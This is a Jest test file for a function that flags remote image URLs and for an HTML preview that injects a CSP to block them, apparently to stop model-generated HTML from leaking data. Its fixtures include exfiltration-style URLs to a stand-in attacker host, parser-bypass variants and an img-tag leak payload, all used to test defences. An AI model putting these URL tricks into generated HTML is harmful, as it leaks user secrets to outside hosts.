import { PREVIEW_IMAGE_CSP, htmlPreviewSrcDoc, isRemoteImageUrl } from '../remoteImages';

describe('isRemoteImageUrl', () => {
  const origin = 'http://localhost:5701';

  it.each([
    ['relative path', '/api/v2/conversations/x/files/y.png', false],
    ['data URI', 'data:image/png;base64,AAAA', false],
    ['blob URI', 'blob:http://localhost:5701/abc', false],
    ['same-origin absolute URL', 'http://localhost:5701/api/v2/x.png', false],
    ['other host', 'https://attacker.example/p.png?d=secret', true],
    ['other port', 'http://localhost:9999/x.png', true],
    ['protocol-relative URL', '//attacker.example/x.png', true],
    ['empty string', '', false],
    // Browsers treat `\\` as `//` in markup URL attributes: this is a fetch.
    ['two backslashes before the host', '\\\\attacker.example/p.png?d=secret', true],
    ['one backslash before the host', '\\attacker.example/p.png', false],
    ['backslashes inside an absolute URL', 'https:\\\\attacker.example/x.png', true],
    ['scheme without slashes', 'https:attacker.example/x.png', true],
    ['embedded newline in a remote URL', 'https://attacker.example\n/x.png', true],
    ['backslash inside a relative path', 'images\\a.png', false],
    // The URL parser strips leading/trailing C0 controls and spaces.
    ['leading control character, protocol-relative', '\x01//attacker.example/p.png', true],
    ['leading unit separator, backslashes', '\x1f\\\\attacker.example/p.png', true],
    ['leading NUL, absolute URL', '\x00https://attacker.example/p.png', true],
    ['control character before a relative path', '\x01images/a.png', false],
    // A non-breaking space is not stripped, so this stays a path on our origin.
    ['leading non-breaking space', '\u00a0//attacker.example/p.png', false],
  ])('treats %s as remote=%s', (_name, url, expected) => {
    expect(isRemoteImageUrl(url, origin)).toBe(expected);
  });

  it('fails closed on an unparseable absolute-looking URL', () => {
    expect(isRemoteImageUrl('https://[::1', origin)).toBe(true);
  });

  it('handles a custom app scheme as the page URL', () => {
    const page = 'tauri://localhost/chat';

    expect(isRemoteImageUrl('/logo.png', page)).toBe(false);
    expect(isRemoteImageUrl('data:image/png;base64,AAAA', page)).toBe(false);
    expect(isRemoteImageUrl('https://attacker.example/p.png', page)).toBe(true);
  });
});

describe('htmlPreviewSrcDoc', () => {
  it('injects a CSP that blocks remote images ahead of the model HTML', () => {
    const srcDoc = htmlPreviewSrcDoc('<img src="https://attacker.example/?d=secret">');

    expect(srcDoc).toContain(`content="${PREVIEW_IMAGE_CSP}"`);
    expect(PREVIEW_IMAGE_CSP).toBe("img-src 'self' data: blob:");
    expect(srcDoc.indexOf('Content-Security-Policy')).toBeLessThan(
      srcDoc.indexOf('attacker.example')
    );
  });
});
